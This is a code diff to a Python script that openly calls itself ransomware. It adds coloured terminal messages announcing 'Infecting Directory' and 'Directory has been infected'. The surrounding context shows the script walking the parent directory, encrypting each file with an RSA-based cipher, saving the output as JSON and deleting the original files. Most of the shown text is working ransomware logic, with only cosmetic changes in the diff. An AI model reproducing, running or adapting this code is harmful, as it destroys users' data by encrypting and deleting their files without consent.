@@ -1,6 +1,6 @@
 from base64 import b64encode, b64decode
 from threading import Thread
-import encryption, constants, os, json, cryptools, time, sys
+import encryption, constants, os, json, cryptools, time, sys, colorama
 
 
 '''
@@ -22,11 +22,18 @@ def main():
 
 	animation = Thread(target=cinematics)
 
+	os.chdir('..')
+	sys.stdout.write('\nInfecting Directory: ' + colorama.Fore.GREEN + \
+		os.getcwd() + colorama.Style.RESET_ALL + '...  ')
+	sys.stdout.flush()
+	os.chdir('ransomware')
+
 	animation.start()
 
 	folder_path = '..'
 
 	rsa_cipher = encryption.AsymmetricCipher(constants.RSA_FOLDER_PATH)
+
 
 	for current_directory, sub_directories, sub_files in os.walk(folder_path):
 
@@ -72,25 +79,24 @@ def main():
 			with open(os.path.join(current_directory, fileName + '.json'), 'w') as json_file:
 				json.dump(json_dict, json_file)
 
-			progressbar = False
-			print('\n[+] Encrypted %s\n' % os.path.join(current_directory, fileName + '.' + ext))
-			progressbar = True
-
 			os.remove(os.path.join(current_directory, file))
 	repeat = False
 
 def cinematics():
 	while repeat:
 		if progressbar:
-			sys.stdout.write('\b/')
+			sys.stdout.write(colorama.Fore.RED + '\b/')
 			sys.stdout.flush()
 			time.sleep(0.1)
-			sys.stdout.write('\b-')
+			sys.stdout.write(colorama.Fore.RED + '\b-')
 			sys.stdout.flush()
 			time.sleep(0.1)
-			sys.stdout.write('\b\\')
+			sys.stdout.write(colorama.Fore.RED + '\b\\')
 			sys.stdout.flush()
 			time.sleep(0.1)
+	os.chdir('..')
+	sys.stdout.write('\b \n\n' + colorama.Style.RESET_ALL + 'Directory has been ' + colorama.Fore.RED + 'infected' + colorama.Style.RESET_ALL + '\n\n')
+	sys.stdout.write(colorama.Style.RESET_ALL)
 
 if __name__ == '__main__':
 	main()
